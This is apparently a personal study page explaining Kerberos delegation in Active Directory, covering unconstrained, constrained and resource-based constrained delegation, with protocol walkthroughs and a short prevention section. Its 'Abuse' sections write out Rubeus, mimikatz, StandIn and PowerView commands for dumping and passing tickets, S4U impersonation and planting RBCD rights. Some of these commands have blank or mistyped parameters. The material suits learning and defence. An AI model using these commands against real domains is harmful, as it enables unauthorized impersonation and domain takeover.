---
description: >-
  Credits to ATTL4S to helping me understand this, and I also used some of his
  images.
---

# Delegation

Personally, Kerberos and its delegation mechanisms have always been a little fuzzy for me, and I wanted to take the time to understand it. Basically, this page is my attempt of understanding Delegation, why its used and attacks on it phrased in my own words.

## Double Hop Problem

Suppose a user logs in to a machine, let's say the `WEB` machine, but how does the `WEB` machine authenticate to the **same** server and **access the database folders?** This is where's Windows Authentication mechanism comes in.

This idea of "acting on the behalf of another user" is possible thanks to Windows's **Client Impersonation** feature as part of authentication. When we attempt to connect to the web app, credentials are verified, and **an acces token with the security context of the user is created**.

When we enter the credentials of the user, this would be compared against the credentials stored in `lsass.exe` and create a **new user logon session and access token on the target system**. The service places a **copy of that Token into a new thread, and this new thread can act on the user's behalf**. Since we have credentials, the new logon session would have credentials and thus we can operate normally.

This token thing is also the reason why we can 'steal tokens' from processes running as other users to impersonate them and run commands as them.

**However, this assumes that the resources we want to access are on the SAME SERVER.** For example, if the `C:\Database` and `C:\Web` folders are both located within the `WEB` machine, then just having the user's password is enough.

If there are 2 different servers, say `WEB` and `DB`, then this method of authentication would not work. `lsass.exe` would not normally store the credentials of another user from another machine. A new logon session is thus still created, **but because we have no credentials, we cannot go anywhere with this session**. This is known as the **Double Hop Problem**.

## Delegation

Delegation basically allows a user or machine to act on the behalf of another user to another service. One common implementation is where a user authenticates to a front-end web application that serves a back-end database.

The front-end needs to authenticate to the back-end database (using Kerberos) as the authenticated user. This is how delegation works in a nutshell:

<figure><img src="../../.gitbook/assets/image (3525).png" alt=""><figcaption></figcaption></figure>

### Password / NTLM Authentication?

Delegation allows for the impersonation of users **in the network and not only locally**. Access tokens that are created using credentials are for local purposes only. For this, we can use **credential delegation,** and one common example is Remote Powershell Sessions.

This method involves sending some kind of credential material to the service, so that the service can impersonate clients in the network. Here are some commands that make use of this feature:

```powershell
#Predefine necessary information
$Username = "YOURDOMAIN\username"
$Password = "password"
$ComputerName = "server"
$Script = {notepad.exe}
#Create credential object
$SecurePassWord = ConvertTo-SecureString -AsPlainText $Password -Force
$Cred = New-Object -TypeName "System.Management.Automation.PSCredential" -ArgumentList $Username, $SecurePassWord
#Create session object with this
$Session = New-PSSession -ComputerName $ComputerName -credential $Cred
# Enter-PSSession
$job = invoke-command -session $session -scriptblock $script
echo $job
```

This solves the Double Hop problem, because we can access another user and run commands as a user on the network instead of just locally. This method would also require the user to be part of the **Remote Management Group** on the network.

Obviously, this is not the most secure method as sending credentials in plaintext is never a good idea, especially for service accounts (which generally have high permissions over certain resources in the domain). Sending NTLM hashes is also not great because Pass The Hash attacks exist. As such, it is normal for NTLM authentication to be disabled completely.

{% embed url="https://blog.quest.com/ntlm-authentication-what-it-is-and-why-you-should-avoid-using-it/" %}

In the HTB machine Hathor, NTLM authentication (and hence passwords) are completely disabled, leaving us with only Kerberos authentication. Kerberos authentication, while still risky, **does not depend on the user's original password or NTLM hashes**. The authentication is based on tickets and session keys, and they are trusted by default.

Having tickets and session keys cached on a server is relatively more secure compared to passwords or hashes in general. This is why in some systems, only Kerberos authentication is allowed.

There are 3 main types of delegation available in AD systems:

1. Unconstrained Delegation
2. Constrained Delgation
3. Role-Based Constrained Delegation (RBCD)

Exploitation of any of these privileges is not a CVE, but rather an **abuse of a service**. This uses the intentional features of the system against itself.

## Unconstrained Delegation

This is the first type of delegation introduced in Windows 2000. When configured, the KDC would include a copy of the user's TGT **inside the TGS**. when the user accesses the `DB` machine, it extracts the user's TGT from the TGS and caches it in memory. Then, it would use this TGT to request for a TGS, which would allow for the accessing of database resources.

<figure><img src="../../.gitbook/assets/image (1012).png" alt=""><figcaption></figcaption></figure>

The service can act on behalf of the client in the network **simply by using its TGT**. This feature requires the `SeEnableDelegation` privilege to be enabled. We can configure this like so:

<figure><img src="../../.gitbook/assets/image (1052).png" alt=""><figcaption></figcaption></figure>

With this setting enabled, all we need are credentials for the user. Now suppose that we are on `WEB` machine and want to access the files on the `DB` machine, and we can do so using a web login form. This is how the requests are formed:

1. **AS REQ ->** `WEB` machine requests for TGT from `DC`. This part requires the credentials of the user to be correct in order to authenticate to the KDC.
2. **AS REP ->** `DC` sends the `web_user` TGT to the `WEB` machine as a reply after verifying that we have the right credentials.
3. **TGS REQ 1 ->** The `WEB` machine would send a TGS REQ, specifying a target SPN such as `HTTP/db.corp.local`. This would be sent along with the TGT.
4. **TGS REP 1 ->** The KDC notices that we have Unconstrained Delegation set. As such, the resulting HTTP Service Ticket sent back has the `ok-as-delegate` flag set in the reply. This would inform the `WEB` machine that the service is suitable as a delegate. The KDC sends back the TGS required.
5. **TGS REQ 2 ->** The `WEB` machine sends another request to the DC with the TGT and SPN of `krbtgt/corp.local`. `WEB` also asks for a **forwarded TGT** to be sent to the service. The **forwarded flag** of the ticket has been set to true for this.
6. **TGS REP 2 ->** The KDC expects this request as a follow-up because the Unconstrained setting is enabled, and it expects the **forwarded flag of the TGT to be set to true**. It checks for this, and then it sends back an `encTGSRep` and an **authenticator string** that also has the **forwarded flag set to true**.
7. **AP REQ (HTTP) -> This part happens when we send a request to the resource** (such as `ls \\db\c$` or visiting a particular resource). Using the encrypted TGS REP, the `WEB` machine sends the Service Ticket for `HTTP/db.corp.local` and an Authenticator string received from TGS REP 2. The session key and TGT are present within the `krb-cred` structure, and other information is decrypted here.
8. **TGS REQ 3 ->** The `DB` machine sends a regular TGS REQ on behalf of the `WEB` user with the authenticator string required. This time, it requests using SPN of `cifs/db.corp.local`.
9. **TGS REP 3 ->** The `DC` replies to `DB` with a basic TGS REP and sends over another `encTGSRep` for the `WEB` user and SPN of `cifs`.
10. **AP REQ (SMB) ->** Another AP REQ through SMB is sent on behalf of the `WEB` user. This time, it presents the `cifs` ticket + authenticator strings.
11. **AP REP (SMB) ->** The `cifs` service sends an AP REP through SMB, which contains an ST for `cifs/db.corp.local` encrypted with the session key.
12. **AP REP (HTTP) ->** The `cifs/db.corp.local` ST is sent back to the `WEB` machine, and this establishes mutual authentication between the `WEB` and `DB` machines. Thus, we can access the file system or other resources of the `DB` machine from `WEB` after this final reply.

That's a lot to take in. Here's a packet capture from ATTL4S regarding this subject (take note he uses different machines here, but the concept is roughly the same):

<figure><img src="../../.gitbook/assets/image (3562).png" alt=""><figcaption></figcaption></figure>

### Abuse

Unconstrained Delegation would cache the user's TGT regardless of which service is being accessed by the user. For example, if an administrator accesses a file share on the machine that uses Kerberos, their TGT will be cached.

If we can compromise this machine, the TGTs can be extracted from memory and used to impersonate the users against other services in the domain. This can be done through:

* Phishing
* Abuse of user clicking on certain files (like `.lnk` or `.scf` files)
* RPC, abusing `xp_dirtree`, using tools such as `SharpSpoolTrigger.exe`, etc... As long as are able to make one machine interact with another in some way.

We can use `Rubeus.exe` to exploit this. Suppose that we have the use'rs TGT already cached on the machine (via forcing or scheduled task exploitation). We can use the `triage` and `dump` functions to retrieve this ticket:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># find all tickets
</strong><strong>Rubeus.exe triage
</strong><strong># dump tickets
</strong>Rubeus.exe dump /luid:0x14794e /nowrap
# pass this ticket
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:corp.local /username:administrator /password:password123 /ticket:&#x3C;TICKET>
# in cobalt strike
steal_token &#x3C;PID> 
</code></pre>

Alternatively, we can use `mimikatz` to exploit this by first exporting all tickets and then passing them along to allow us to access the remote file system or establish a remote Powershell session.

{% code overflow="wrap" %}
```
mimikatz::tickets /export

mimikatz # kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\[0;3c785]-2-0-40e10000-Administrator@krbtgt-OFFENSE.LOCAL.kirbi
```
{% endcode %}

## Constrained Delegation

This new method was introduced in 2003 as a safer means to perform Kerberos delegation. It is the same thing, but this time it **restricts the services to which the server can act on behalf of a user**. It also no longer allows the server to cache the TGTs of other users, but **it does allow for the server to request a TGS for another user with its own TGT**.

To configure this, we just have to check the other setting and specify what type of authentication is allowed:

<figure><img src="../../.gitbook/assets/image (2970).png" alt=""><figcaption></figcaption></figure>

Additionally, there are 2 new Service-For-User (S4U) Kerberos extensions introduced for these services:

* Kerberos constrained delegation extension called **S4UProxy**.
  * Allows a service to obtain a ST on behalf of a client to a different service.
  * Only ST is required to show that client has authenticated.
* Kerberos protocol transition extension called **S4USelf**.
  * Allows a service to obtain a **ST to itself** to show that a client has authenticated.
  * Any service account with an SPN can invoke S4U2Self. The resulting ST can vary depending on the rights of the service account.

The **Kerberos only** option uses S4U2Proxy, while the other option both new extensions. Setting up these configurations requires either DA or EA privileges (to enable `SeEnableDelegation`). I'll break both of these options down here.

### Kerberos Only

In the interest of keeping this page shorter, I won't be covering the full request here since it's largely the same as Unconstrained Delegation except for a few changes. Again, ATTL4S provides a clear packet capture on how it works:

<figure><img src="../../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>

The differences are in the TGS REQ and TGS REP to the `cifs` service with the S4U2Proxy extension. It's the same up the point AFTER the AP REQ (HTTP) part:

1. **TGS REQ 3 ->** This takes the machine's TGT + authenticator string and sends a request for SPN `cifs/db.corp.local`. Additionally, the user's ST is sent too. This request would have the RBCD and Constrained Delegation flags set to **true**. The user's ST also has the **forwardable** flag set to **true**.
2. **TGS REP 3 ->** The DC checks whether the current `WEB` machine is able to delegate to the service requested (whether `WEB` can delegate to `DB`). It then responds with the user's ST + Session Key.
3. **AP REQ (SMB) ->** The `WEB` machine sends an AP REQ through SMB on behalf of the user.
4. **AP REP (SMB) ->** The AP REP would send the ST back, and it would sent the **AP REP (HTTP)** back to the `WEB` machine. This would complete the authentication process.

This is deemed more secure than Unconstrained Delegation because it no longer allows servers to cache the TGTs of other users, but rather it allows the user to request a TGS for another user using their own TGT.

### Abuse of Kerberos Only

The abuse of this service only requires an addtional ticket as a requirement to invoke S4U2Proxy. In short, we just need the TGT of the principal that is trusted for delegation, and we can use `Rubeus.exe` to gain access to the resource. The most common method of abuse involves using RBCD (which will be covered below).

We can find out the principals that are trusted for delegation by checking for the `msds-allowedtodelegate` attribute.

```
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

[*] TOTAL NUMBER OF SEARCH RESULTS: 1
[
  {
    "dnshostname": "sql-2.dev.cyberbotic.io",
    "samaccountname": "SQL-2$",
    "msds-allowedtodelegateto": [
      "cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io",
      "cifs/dc-2.dev.cyberbotic.io",
      "cifs/DC-2",
      "cifs/dc-2.dev.cyberbotic.io/DEV",
      "cifs/DC-2/DEV"
    ]
  }
]
```

There are other ways to enumerate this with Powershell and what not. How the exploit works is first getting the TGT of the `SQL-2` machine in the above example. Afterwards, we can use `Rubeus.exe s4u` module to request a ST for the resource we want, in this case the `cifs/dc-2` service.

```
.\Rubeus.exe s4u /impersonateuser:administrator /user:SQL$ /msdsspn:cifs/dc-2 /ticket:<TICKET> /nowrap
```

The above command would return the ticket that we can use to `createnetonly` and access the file system of `dc-2` via `cifs/dc-2`.

Here's what `Rubeus` is basically doing: Obtain TGS using TGT (passed in) for user via S4U2Self to current machine -> Build S4U2Proxy request to obtain TGS for user to service required. This works because we have the initial TGT obtained.

### Protocol Transition

In short, this is the machine's way of saying that **it doesn't actually care how the client authenticates.** It can be via cleartext password, NTLM hashes or whatever. This can be configured by specifying a provider:

<figure><img src="../../.gitbook/assets/image (2346).png" alt=""><figcaption></figcaption></figure>

This would make use of the S4U2Self extension, and we can technically invoke S4U2Proxy using this even if we don't have an additional ticket to use. Again, ATTL4S provides the network traffic:

<figure><img src="../../.gitbook/assets/image (3065).png" alt=""><figcaption></figcaption></figure>

There are bigger differences in the requests made using this method:

1. **TGS REQ 1 (S4U2Self) ->** The `WEB` machine would request for the user's fowardable ST for itself using S4U2Self. This is because the initial authentication uses NTLM, and there are no STs sent by the client.
2. **TGS REP 1 (S4U2Self) ->** The `DC` verifies that the `WEB` machine has the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag and responds by sending back the user's ST. The ST that is sent back is **forwadable** thanks to S4U2Self.

<figure><img src="../../.gitbook/assets/image (3672).png" alt=""><figcaption></figcaption></figure>

3. **TGS REQ 2 (S4U2Proxy) ->** Uses the `WEB` TGT + the user's forwardable ST and requests for a TGS for `cifs` or other services on another machine like `DB`.
4. **TGS REP 3 (S4U2Proxy) ->** DC checks if `WEB` can delegate to `DB`. Then, it also checks if the additional ticket is forwadable. Afterwards, it responds with the user's ST + `encTGSRep`. If this ticket is not marked as forwardable, then there would have been an error. The KDC **would try for RBCD as a 'fallback'**.
5. **AP REQ (SMB) ->** AP REQ through SMB on behalf of the user, and this uses the `cifs` TGS it received earlier.
6. **AP REP (SMB) ->** AP REP through SMB that sends an ST for the `cifs` service on `DB`. Afterwards, this is sent via the **AP REP (HTTP)** to grant access to the services.

### Abuse of Protocol Transition

An account configured with protocol transition can invoke S4U4Self to **impersonate any user and obtain a forwardable ST for S4U2Proxy**. This ST obtained can be configured to target others from the same service since the service name of a ST is in plaintext and can be changed.

To abuse this, we would first need to request for a TGT for `WEB` or the machine we are on. This can be done via `Rubeus.exe` by either dumping tickets from memory, passing a hash, whatever.

{% code overflow="wrap" %}
```
Rubeus.exe s4u /impersonateuser:Administrator /user:WEB$ /rc4:<HASH> /msdspn:cifs/DB /altservice:http/DB /nowrap
```
{% endcode %}

The `/altservice` flag is the the service name that we have substituted, since it is in plaintext after all. The command above would invoke S4U2Self to obtain an ST for the administrator. The resulting ticket would be forwardable, and thus can be used to invoke S4U2Proxy.

This would allow us to basically retrieve the ST of the alternate service we have specified.

## Resource-Based Constrained Delegation (RBCD)

Enabling either Constrained or Unconstrained Delegation requires the `SeEnableDelegationPrivilege` to be enabled for users, which can only be done using DA or EA rights.

When we configure the `msds-AllowedToDelegateTo` attribute, **the backend server has no say in this**. For example, if we configure the `WEB` machine such that it can delegate to the `DB` server, it is done on the `WEB` machine, and the `DB` machine **has no choice but to say yes**.

RBCD reverses this concept by letting the `DB` machine (or backend) to control instead through another attribute called `msds-allowedtoactonbehalfofotheridentity` attribute. This attribute does not require DA or EA privileges, and we only need one of these privileges to do so:

* **WriteProperty**
* **GenericAll**
* **GenericWrite**
* **WriteDacl**

Again, to re-emphasise, the configuration is done on the 'backend' machine and does not require DA or EA permissions. We just need to be an administrator on the 'backend' machine.

<figure><img src="../../.gitbook/assets/image (3304).png" alt=""><figcaption></figcaption></figure>

This method of authentication is closely related to the classic Constrained Delegation and uses the S4U extensions. Here's a snippet of the traffic:

<figure><img src="../../.gitbook/assets/image (1432).png" alt=""><figcaption></figcaption></figure>

It is largely the same as the Constrained Delegation Protocol Transition method of authenticating, with a few differences:

1. **TGS REQ 1 (S4U2Self) ->** Sends the `WEB` TGT and requests for the user's forwadable ST using S4U2Self.
2. **TGS REP 1 (S4U2Self) ->** DC checks that the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag is **NOT ENABLED.** Reponds with the user's **NON-FORWADABLE ST.** This is because the `WEB` machine is not trusted.
3. **TGS REQ 2 (S4U2Proxy) ->** Takes `WEB` TGT + User's non-forwadable ST from S4U2Self and requests for the `cifs/DB` service. **Both the RBCD and Constrained Delegation bits are set!!!**
4. **TGS REP 2 (S4U2Proxy) ->** DC verifies that RBCD bit is set, and checks whether `WEB` can delegate to `DB` via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. In RBCD, **invoking S4U2Proxy with a non forwardable ST results in a forwadable ST.** With classic Constrained Delegation, this would have failed. The DC then responds with the user's ST + Session Key.
5. **AP REQ (SMB) ->** Same as above.
6. **AP REP (SMB) ->** Same as above. The resulting ST for `cifs/DB` is sent through the **AP-REP (HTTP)**.

### Abuse

If we have write access over the `msDS-AllowedToActOnBehalfOfOtherIdentity`, we can configure RBCD. We just need to have an account that is able to invoke S4U2Self and S4U2Proxy, which generally any service account can do.

#### Pre-Configured

First we have to grab the TGT of the `WEB` machine via whatever method and invoke the S4U2Self method:

```
Rubeus.exe s4u /impersonateuser:administrator /user:WEB$ /rc4: /msdsspn:cifs/DB 
```

This would give us an ST for the administrator that is **non-forwadable**. The ST can be used to invoke S4U2Self and obtain an ST for the trusting service:

{% code overflow="wrap" %}
```
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:corp /username:administrator /password:FakePass /ticket:
```
{% endcode %}

#### Configure Ourselves

Sometimes, we don't have the required attribute enabled, but we can configure it. First we have to determine if our current machine has the required privileges and create a new security descriptor:

{% code overflow="wrap" %}
```powershell
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

# Suppose we have access to the correct user / machine and we have the required privileges over the DB machine:
Get-DomainComputer -Identity WEB -Properties objectSid

# Create Security Descriptor for the msDS-AllowedToActOnBehalfOfOtherIdentity in raw binary format
$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
$rsdb = New-Object byte[] ($rsd.BinaryLength)
$rsd.GetBinaryForm($rsdb, 0)

# then grab the current machine's TGT and run the commands for Rubeus to perform s4u to grab the ST of the cifs service on DB.
```
{% endcode %}

#### Create Object

If we do not have administrative access over our current machine for whatever reason, **we can create our own computer object**. By default, even domain users can join up to 10 computers to a domain via the `msds-MachineAccountQuota` attribute.

This method of abuse can be done via LDAP, Powershell or `StandIn.exe`:

{% code overflow="wrap" %}
```powershell
# create new object with random password given
StandIn.exe --computer EvilComputer --make

# calculate RC4 Hash
Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:corp

# grab TGT of our new device
Rubeus.exe asktgt /user:EvilComputer$ /rc4 OR aes256: /nowrap

# now that we have a TGT our new machine, we can configure the SDDL required and grab the ST of the service we want!
```
{% endcode %}

There are other methods of abuse located all over the internet, in cheatsheets or other people's Gitbooks. These aren't the only methods of abuse, and there are plenty more, but the general idea is the same!

## Prevention

To prevent such attacks, we can do a few things:

* Protected Users Group -> Users part of this group would cause the KDC to not set the STs given to be FORWADABLE or PROXIFIABLE.
* Flag account as **sensitive** -> This bit would cause TGTs and STs obtained by this account to not be forwadable or proxifiable even when requested.

<figure><img src="../../.gitbook/assets/image (2885).png" alt=""><figcaption></figcaption></figure>

Either one of these would totally prevent S4U2Self and S4U2Proxy from working entirely. These methods **cannot prevent all forms of abuse**. If you stash your credentials in plaintext on your desktop and it is compromised, then that's on you. No amount of delegation can prevent that!
